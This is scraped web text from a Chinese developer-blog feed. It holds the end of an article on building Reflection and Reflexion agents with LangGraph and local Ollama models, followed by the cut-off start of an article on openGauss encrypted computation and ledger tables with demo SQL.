<li>资源受限环境</li>
</ul>
<p><strong>选择Reflexion的场景：</strong></p>
<ul>
<li>专业技术问题</li>
<li>需要最新信息的查询</li>
<li>学术研究支持</li>
<li>准确性要求极高的场景</li>
</ul>
<h2 data-id="heading-22">三. 系统整体架构</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1a67fb2d50940dc9e88a2e73e7f4c37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=jhLKxh0z0t9uqKXZtRwaVL%2BDlGo%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-23">四. 关键技术实现</h2>
<h3 data-id="heading-24">1. 真正的流式输出架构</h3>
<p>我们实现了逐token的实时流式输出，而不是传统的分段式伪流式：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2598b4de33f2474ab877a0e979cb564a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=9rZh2FMRlabF9nZo9n9Ui8V%2F%2FRo%3D" alt="" loading="lazy"/></p>
<p><strong>核心代码实现</strong>：</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-comment"># backend/src/agents/reflection_agent.py</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_stream</span>(<span class="hljs-params">self, input_text: <span class="hljs-built_in">str</span>, domain: <span class="hljs-built_in">str</span> = <span class="hljs-string">"general"</span></span>) -&gt; AsyncGenerator[<span class="hljs-built_in">str</span>, <span class="hljs-literal">None</span>]:
        <span class="hljs-comment"># 流式生成内容</span>
        <span class="hljs-keyword">async</span> <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> self.llm_manager.generate_stream(request):
            generated_content += chunk
            <span class="hljs-keyword">yield</span> json.dumps({
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"generate_chunk"</span>,
                <span class="hljs-string">"iteration"</span>: current_iteration,
                <span class="hljs-string">"chunk"</span>: chunk
            }) + <span class="hljs-string">"\n"</span>
</code></pre>
<h3 data-id="heading-25">2. 配置参数动态化</h3>
<p>系统从配置文件动态读取所有LLM参数，避免硬编码：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46ebf67c9b2744268d7a19785c17a9a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=e2JI%2BGt9RBuD1QyMLzMRSsD58xY%3D" alt="" loading="lazy"/></p>
<p><strong>配置示例</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml">    <span class="hljs-comment"># configs/config.yaml</span>
    <span class="hljs-attr">llm:</span>
      <span class="hljs-attr">ollama:</span>
        <span class="hljs-attr">model:</span> <span class="hljs-string">"qwen3:8b"</span>
        <span class="hljs-attr">temperature:</span> <span class="hljs-number">0.7</span>
        <span class="hljs-attr">max_tokens:</span> <span class="hljs-number">5000</span>

    <span class="hljs-attr">agents:</span>
      <span class="hljs-attr">reflection:</span>
        <span class="hljs-attr">max_iterations:</span> <span class="hljs-number">3</span>
      <span class="hljs-attr">reflexion:</span>
        <span class="hljs-attr">max_iterations:</span> <span class="hljs-number">5</span>
</code></pre>
<h3 data-id="heading-26">3. LangGraph工作流状态管理</h3>
<p>使用LangGraph的StateGraph管理复杂的智能体工作流：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59b7a7b3810c47a6a0f3d2eb904fda8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=R7F5Lgp4DQKXMC7hnLvY8gOfM48%3D" alt="" loading="lazy"/></p>
<p><strong>LangGraph工作流构建</strong></p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_reflection_graph</span>(<span class="hljs-params">self</span>) -&gt; StateGraph:
        <span class="hljs-string">"""构建Reflection智能体工作流图"""</span>
        workflow = StateGraph(ReflectionState)
        
        <span class="hljs-comment"># 添加节点</span>
        workflow.add_node(<span class="hljs-string">"generate"</span>, self._generate_content_node)
        workflow.add_node(<span class="hljs-string">"critique"</span>, self._critique_content_node)
        workflow.add_node(<span class="hljs-string">"improve"</span>, self._improve_content_node)
        workflow.add_node(<span class="hljs-string">"finalize"</span>, self._finalize_node)
        
        <span class="hljs-comment"># 定义边和条件</span>
        workflow.add_edge(START, <span class="hljs-string">"generate"</span>)
        workflow.add_edge(<span class="hljs-string">"generate"</span>, <span class="hljs-string">"critique"</span>)
        
        workflow.add_conditional_edges(
            <span class="hljs-string">"critique"</span>,
            self._should_continue,
            {
                <span class="hljs-string">"continue"</span>: <span class="hljs-string">"improve"</span>,
                <span class="hljs-string">"finish"</span>: <span class="hljs-string">"finalize"</span>
            }
        )
        
        workflow.add_conditional_edges(
            <span class="hljs-string">"improve"</span>,
            self._check_iteration_limit,
            {
                <span class="hljs-string">"continue"</span>: <span class="hljs-string">"critique"</span>,
                <span class="hljs-string">"finish"</span>: <span class="hljs-string">"finalize"</span>
            }
        )
        
        workflow.add_edge(<span class="hljs-string">"finalize"</span>, END)
        
        <span class="hljs-keyword">return</span> workflow
</code></pre>
<h3 data-id="heading-27">4. Ollama本地模型集成</h3>
<p>完整支持Ollama本地模型，无需API密钥：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47bd0ceedaf046d48b76422a13b2dbf4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=iD%2Bs52yI3dYe0vHfNcaM4sUS3ec%3D" alt="" loading="lazy"/></p>
<p><strong>Ollama客户端实现</strong>：</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-comment"># backend/src/utils/llm_manager.py</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">OllamaClient</span>:
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, base_url: <span class="hljs-built_in">str</span>, model: <span class="hljs-built_in">str</span>, **kwargs</span>):
            self.base_url = base_url
            self.model = model
            self.temperature = kwargs.get(<span class="hljs-string">'temperature'</span>, <span class="hljs-number">0.7</span>)
            self.max_tokens = kwargs.get(<span class="hljs-string">'max_tokens'</span>, <span class="hljs-number">4000</span>)

        <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_stream</span>(<span class="hljs-params">self, prompt: <span class="hljs-built_in">str</span></span>) -&gt; AsyncGenerator[<span class="hljs-built_in">str</span>, <span class="hljs-literal">None</span>]:
            <span class="hljs-comment"># 实现真正的流式生成</span>
            <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:
                <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.post(<span class="hljs-string">f"<span class="hljs-subst">{self.base_url}</span>/api/generate"</span>,
                                      json={<span class="hljs-string">"model"</span>: self.model, <span class="hljs-string">"prompt"</span>: prompt,
                                            <span class="hljs-string">"stream"</span>: <span class="hljs-literal">True</span>}, timeout=<span class="hljs-literal">None</span>) <span class="hljs-keyword">as</span> response:
                    <span class="hljs-keyword">async</span> <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> response.content:
                        <span class="hljs-keyword">if</span> line:
                            <span class="hljs-keyword">yield</span> json.loads(line)[<span class="hljs-string">"response"</span>]
</code></pre>
<h2 data-id="heading-28">性能优化策略</h2>
<h3 data-id="heading-29">1. 流式输出性能优化</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbd138869b364f3cbc9287d707d8e603~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=xyEjh5pkJuVrTOsjZZTjwx9fCuw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-30">2. 模型调用优化</h3>
<ul>
<li><strong>温度参数分层</strong>：生成阶段使用较高温度(0.7)，批评阶段使用较低温度(0.3)</li>
<li><strong>Token分配策略</strong>：
<ul>
<li>内容生成：100% max_tokens</li>
<li>自我批评：75% max_tokens</li>
<li>内容改进：100% max_tokens</li>
</ul>
</li>
</ul>
<h2 data-id="heading-31">技术挑战与解决方案</h2>
<h3 data-id="heading-32">挑战1：真正的流式输出实现</h3>
<p><strong>问题</strong>：传统实现是等待完整响应后分段发送，用户体验不佳。</p>
<p><strong>解决方案</strong>：</p>
<ul>
<li>使用Python的异步生成器(AsyncGenerator)</li>
<li>实现Server-Sent Events(SSE)长连接</li>
<li>前端使用ReadableStream处理流式数据</li>
</ul>
<h3 data-id="heading-33">挑战2：LangGraph状态管理</h3>
<p><strong>问题</strong>：复杂的状态转换和条件判断。</p>
<p><strong>解决方案</strong>：</p>
<ul>
<li>使用TypedDict定义严格的状态结构</li>
<li>实现条件边(conditional edges)处理分支逻辑</li>
<li>采用dataclass进行状态封装</li>
</ul>
<h3 data-id="heading-34">挑战3：Ollama集成稳定性</h3>
<p><strong>问题</strong>：本地模型加载、超时处理、错误恢复。</p>
<p><strong>解决方案</strong>：</p>
<ul>
<li>实现连接池和重试机制</li>
<li>添加健康检查和自动重启</li>
<li>支持多模型fallback策略</li>
</ul>
<h2 data-id="heading-35">应用输出示例</h2>
<h3 data-id="heading-36">示例1：写作任务</h3>
<p>**任务：**写一篇关于人工智能的简短介绍</p>
<p><strong>Reflection智能体输出：</strong></p>
<pre><code class="hljs">第一次生成：AI是计算机科学的一个分支。

自我批评：这太简单了，没有提供具体信息。

改进后：人工智能是计算机科学的一个分支，致力于创建能够执行通常需要人类智能的任务的机器。

自我批评：还是没有深入说明AI的具体应用。

最终输出：人工智能（AI）是计算机科学的一个分支，致力于创建能够模拟人类智能行为的机器系统。AI技术包括机器学习、深度学习、自然语言处理等，广泛应用于图像识别、语音助手、自动驾驶等领域，为现代社会带来了革命性的变化。
</code></pre>
<h3 data-id="heading-37">示例2：技术问题解答</h3>
<p>**任务：**解释区块链技术的工作原理</p>
<p><strong>Reflexion智能体输出：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">初始响应：区块链是一种分布式账本技术...

自省分析：需要更详细的技术细节和实际应用案例

知识缺口：分布式共识机制、具体实现原理

外部搜索：
<span class="hljs-bullet">-</span> "区块链分布式共识算法"
<span class="hljs-bullet">-</span> "区块链工作原理详解"

整合后响应：区块链是一种分布式账本技术，其核心工作原理包括：
<span class="hljs-bullet">1.</span> 数据结构：区块按时间顺序链接，形成链式结构
<span class="hljs-bullet">2.</span> 分布式共识：通过Proof of Work或Proof of Stake等算法达成网络共识
<span class="hljs-bullet">3.</span> 密码学安全：使用哈希函数和非对称加密确保数据安全
<span class="hljs-bullet">4.</span> 去中心化：无单一控制点，增强系统可靠性

实际应用包括比特币、以太坊、智能合约等...
</code></pre>
<h2 data-id="heading-38">总结</h2>
<p>本项目成功构建了一个功能完整的自我改进智能体系统，通过LangGraph实现了Reflection和Reflexion两种核心模式。系统的真正流式输出、参数动态化和Ollama集成等特性，为用户提供了优秀的使用体验。</p>
<h2 data-id="heading-39">源代码</h2>
<p>完整的项目代码和更详细的实现，请访问我的知识星球（<a href="https://link.juejin.cn?target=https%3A%2F%2Ft.zsxq.com%2FCCi0k" target="_blank" title="https://t.zsxq.com/CCi0k" ref="nofollow noopener noreferrer">t.zsxq.com/CCi0k</a> ）</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《openGauss全密态与防篡改账本数据库：云上数据安全与可信的新范式》]]></title>    <link>https://juejin.cn/post/7575031395862855726</link>    <guid>https://juejin.cn/post/7575031395862855726</guid>    <pubDate>2025-11-22T11:36:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575031395862855726" data-draft-id="7575065042158698546" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《openGauss全密态与防篡改账本数据库：云上数据安全与可信的新范式》"/> <meta itemprop="keywords" content="MySQL"/> <meta itemprop="datePublished" content="2025-11-22T11:36:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="光之梦"/> <meta itemprop="url" content="https://juejin.cn/user/1579348606325623"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《openGauss全密态与防篡改账本数据库：云上数据安全与可信的新范式》
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1579348606325623/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    光之梦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T11:36:34.000Z" title="Sat Nov 22 2025 11:36:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>openGauss 推出 <strong>全密态计算（Fully Encrypted Database）</strong>  与 <strong>防篡改账本数据库（Ledger DB）</strong> ，以“可信执行环境 + 分布式校验账本”为核心，实现了从“数据安全”到“数据可信”的跨越。</p>
<h2 data-id="heading-0"><strong>全密态计算：数据不解密也能算</strong></h2>
<p>全密态计算的目标是：</p>
<p>“让数据在加密状态下完成读写、查询与计算，让数据库管理员也无法窥视明文。”</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d9388862e404221a08df2905bf247f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5LmL5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764416194&amp;x-signature=asvUy77qhj%2F8bpEmOcFO%2BbEF414%3D" alt="" loading="lazy"/> </p>
<p>该图展示了 openGauss 在<strong>加密驱动层、数据库内核层、可信执行环境</strong>三层结构下的数据流动路径：</p>
<p>1.  <strong>Application API</strong>：上层业务以明文形式提交 SQL；</p>
<p>2.  <strong>ODBC/JDBC 驱动</strong>：负责将明文转为密文；</p>
<p>3.  <strong>User-Side 加密模块</strong>：在客户端完成加密，不传输明文；</p>
<p>4.  <strong>GaussDB Kernel</strong>：在密文状态下执行查询；</p>
<p>5.  <strong>TEE（可信执行环境）</strong> ：在隔离硬件区域中进行明文计算；</p>
<p>6.  <strong>REE（Rich Execution Environment）</strong> ：处理密文操作，保障性能。</p>
<p>数据全程密文传输与计算，服务器端不保存任何明文密钥。</p>
<p> </p>
<h2 data-id="heading-1"><strong>三层密钥机制与加密流程</strong></h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/780981a874344bf98a60aa8a11adc21d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5LmL5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764416194&amp;x-signature=mdsb8mBpVAfRwfPZtDRCQL3GpPI%3D" alt="" loading="lazy"/> </p>
<p>密钥体系包括三类：</p>
<p>1.  <strong>根密钥（Root Key）</strong></p>
<p>2.  存储于操作系统密钥管理模块（如 secGear、EulerOS KMS）；<strong>主密钥（Master Key）</strong></p>
<p>3.  由客户端生成并通过可信通道传输给数据库内核；<strong>列加密密钥（Column Encryption Key, CEK）</strong>  绑定特定列或字段，实现细粒度数据加密。</p>
<p> </p>
<p>加密流程如下：</p>
<p>1.  <strong>客户端层加密</strong>：数据在本地通过 CEK 加密；</p>
<p>2.  <strong>传输层保护</strong>：通过 SSL / TEE 通道加密传输；</p>
<p>3.  <strong>数据库层计算</strong>：在密文状态下完成等值或范围查询。</p>
<p> </p>
<h2 data-id="heading-2"><strong>密态计算数据流：从加密到查询的全过程</strong></h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4c882fe913d43d089a7f7f65c420c21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5LmL5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764416194&amp;x-signature=m%2FjJEn3r7Z7ePq2RDCGegTdqx4Q%3D" alt="" loading="lazy"/> </p>
<p>实例查询：</p>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-keyword">SELECT</span> c1 <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">WHERE</span> c1 <span class="hljs-operator">&gt;</span> <span class="hljs-number">123</span>;
</code></pre>
<p>1 客户端使用 CEK 加密常量 123 → 0xfe31da05；</p>
<p>2 加密请求通过 SSL 通道发送至 openGauss；</p>
<p>3 GaussDB 在 <strong>REE 环境</strong>执行密文比较；</p>
<p>4 若启用硬件 TEE，则在安全 enclave 中执行明文运算；</p>
<p>5 返回结果时再由客户端解密展示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6eae84af9597411b8b474bb5d48f935f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5LmL5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764416194&amp;x-signature=ws9K9pg8%2FyFCH0Wvmh%2FFx5oBIyM%3D" alt="" loading="lazy"/> 
这样，服务器端即使被攻破，也无法推导出真实业务数据。</p>
<p> </p>
<h2 data-id="heading-3"><strong>防篡改账本数据库：可信可追溯的事务链</strong></h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b45b6249a1d34a8e92f6fffe3f0fa475~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5LmL5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764416194&amp;x-signature=sd5In60oF2nxs6mKFgh%2Flpk8pEg%3D" alt="" loading="lazy"/> </p>
<p>账本数据库是在传统事务数据库（ACID）基础上扩展的<strong>加密时间链系统</strong>，</p>
<p>具备以下特性：</p>
<p>1.  <strong>增量校验算法</strong>：每个 Checkpoint 均记录增量变更哈希；</p>
<p>2.  <strong>一致性验证</strong>：任意节点可快速校验账本一致性；</p>
<p>3.  <strong>分布式存储</strong>：账本切片（slice1, slice2, …）支持跨节点互审。</p>
<p>账本表结构demo：
 </p>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> audit_ledger (  
    tx_id <span class="hljs-type">BIGINT</span>,  
    operator TEXT,  
    action TEXT,  
    ts <span class="hljs-type">TIMESTAMP</span>  
) <span class="hljs-keyword">WITH</span> (ledger <span class="hljs-operator">=</span> <span class="hljs-string">'on'</span>);  
</code></pre>
<p>数据写入时自动生成链式哈希：</p>
<pre><code class="hljs language-SQL" lang="SQL">TX_HASH: <span class="hljs-number">8</span>fe91ac9cde0...  
PREV_HASH: <span class="hljs-number">3</span>ae15f477b81...  
</code></pre>
<p>系统自动维护账本链关系，支持“不可篡改、可追溯”的历史查询。</p>
<p> </p>
<h3 data-id="heading-4"><strong>校验与恢复</strong></h3>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-comment">-- 验证账本完整性  </span>
<span class="hljs-keyword">SELECT</span> ledger_verify(<span class="hljs-string">'audit_ledger'</span>);  
</code></pre>
<p> 
输出：</p>
<pre><code class="hljs language-SQL" lang="SQL">Ledger verified: OK (<span class="hljs-keyword">no</span> tampering detected)  
</code></pre>
<p>即使主机遭到破坏，备机账本链仍能完整恢复</p>
<p> </p>
<h2 data-id="heading-5"><strong>可信执行环境（TEE）与密态计算协同</strong></h2>
<p>openGauss 的全密态能力与 <strong>secGear + Kunpeng + EulerOS</strong> 深度集成，形成“软硬一体化可信执行环境”：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52db432c88464cf6849f28ebc47830a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWJ5LmL5qKm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764416194&amp;x-signature=hRbDBeo4Qv4QrCq7ZsVFcChaHC4%3D" alt="" loading="lazy"/> </p>
<p>这种“TEE + 数据库”的设计使得密文计算在硬件隔离空间执行，从而实现<strong>加密计算性能提升 2.3×，泄露风险趋近于零</strong>。</p>
<p> </p>
<h2 data-id="heading-6"><strong>落地实践：</strong> <strong>密态计算 + 账本审计一体化方案</strong></h2>
<h3 data-id="heading-7">一、  <strong><strong><strong>环境与库初始化（openGauss）</strong></strong></strong></h3>
<p>你已有可用的 openGauss 集群即可，以下命令均在 <strong>gsql</strong> 客户端执行。若是容器/单机版，只要能 gsql -d postgres -p 5432 -r 进库即可。</p>
<pre><code class="hljs language-SQL" lang="SQL"># 连接（请替换端口<span class="hljs-operator">/</span>用户<span class="hljs-operator">/</span>密码）  
gsql <span class="hljs-operator">-</span>d postgres <span class="hljs-operator">-</span>p <span class="hljs-number">5432</span> <span class="hljs-operator">-</span>U omm <span class="hljs-operator">-</span>r  
</code></pre>
<h4 data-id="heading-8">1)  <strong><strong><strong>建业务库与专用 schema、角色</strong></strong></strong></h4>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-comment">-- 业务数据库  </span>
<span class="hljs-keyword">CREATE</span> DATABASE secure_demo;  
\c secure_demo;  
   
<span class="hljs-comment">-- 应用专用 schema 与角色  </span>
<span class="hljs-keyword">CREATE</span> SCHEMA IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> secure <span class="hljs-keyword">AUTHORIZATION</span> <span class="hljs-built_in">CURRENT_USER</span>;  
<span class="hljs-keyword">CREATE</span> ROLE app_rw LOGIN PASSWORD <span class="hljs-string">'AppSecret!123'</span>;  
<span class="hljs-keyword">GRANT</span> USAGE <span class="hljs-keyword">ON</span> SCHEMA secure <span class="hljs-keyword">TO</span> app_rw;  
</code></pre>
<h3 data-id="heading-9"><strong>二、</strong> <strong><strong><strong>表结构设计：密态存储 + 等值索引 + 账本表</strong></strong></strong></h3>
<p>我们采用<strong>应用侧 AES-GCM 加密</strong>，数据库里只存<strong>密文</strong>；为了支持<strong>等值查询</strong>，额外存一列<strong>不可逆的等值检索键</strong>（HMAC/Hash），并在该列上建索引。审计方面，用一张<strong>链式账本表</strong>记录每次操作的摘要哈希，触发器自动写入，支持之后的<strong>链式校验</strong>。</p>
<h4 data-id="heading-10">1)  <strong><strong><strong>业务数据表（只存密文，不落明文）</strong></strong></strong></h4>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-keyword">SET</span> search_path <span class="hljs-keyword">TO</span> secure;  
   
<span class="hljs-comment">-- 用户信息密态表：不保存明文  </span>
<span class="hljs-comment">-- name_hash：等值检索键（HMAC/MD5/其他不可逆摘要），用于 WHERE 等值查询  </span>
